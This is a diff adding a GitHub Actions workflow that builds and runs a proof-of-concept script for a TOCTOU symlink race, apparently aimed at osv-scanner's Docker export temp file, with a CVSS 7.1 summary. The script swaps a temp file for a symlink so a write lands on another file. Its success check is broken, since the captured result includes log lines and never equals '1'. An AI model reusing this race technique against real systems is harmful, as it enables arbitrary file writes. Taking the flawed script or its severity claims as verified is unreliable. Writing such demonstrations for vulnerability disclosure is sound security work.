@@ -1,0 +1,68 @@
+name: "TOCTOU Race Condition - Docker Export"
+on:
+  workflow_dispatch:
+
+jobs:
+  toctou-exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: "Create TOCTOU PoC Script"
+        run: |
+          cat > toctou-poc.sh << 'SCRIPT'
+          #!/bin/bash
+          set -e
+          TEMP_DIR="/tmp"
+          TARGET="$TEMP_DIR/toctou-target.txt"
+          rm -f "$TARGET"
+          echo "SENSITIVE_GITHUB_TOKEN_HERE" > "$TARGET"
+          
+          simulate_scanner() {
+              TEMP=$(mktemp "$TEMP_DIR/docker-image-XXXXX.tar")
+              echo "[osv-scanner] Temp: $TEMP"
+              sleep 0.3
+              if [ -L "$TEMP" ]; then
+                  echo "[VULN] Symlink detected!"
+                  echo "DOCKER_IMAGE_DATA" > "$TEMP"
+                  echo "1"
+              else
+                  echo "[SAFE] Regular file"
+                  echo "0"
+                  rm -f "$TEMP"
+              fi
+          }
+          
+          (
+            sleep 0.05
+            TEMP=$(ls "$TEMP_DIR"/docker-image-*.tar 2>/dev/null | head -1)
+            if [ -n "$TEMP" ]; then
+              rm -f "$TEMP"
+              ln -s "$TARGET" "$TEMP"
+              echo "[ATTACK] Symlink created"
+            fi
+          ) &
+          
+          result=$(simulate_scanner)
+          wait
+          
+          if [ "$result" == "1" ]; then
+            echo "✓ TOCTOU exploited!"
+            echo "✓ Content written to target: $(cat $TARGET | head -c 30)..."
+          fi
+          rm -f "$TARGET"
+          rm -f "$TEMP_DIR"/docker-image-*.tar
+          SCRIPT
+          
+          chmod +x toctou-poc.sh
+      
+      - name: "Run TOCTOU PoC"
+        run: ./toctou-poc.sh
+      
+      - name: "Summary"
+        run: |
+          echo "TOCTOU Race Condition Vulnerability"
+          echo "- Type: CWE-367"
+          echo "- CVSS: 7.1"
+          echo "- Location: imagehelpers.go:61-97"
+          echo "- Impact: Arbitrary file write"
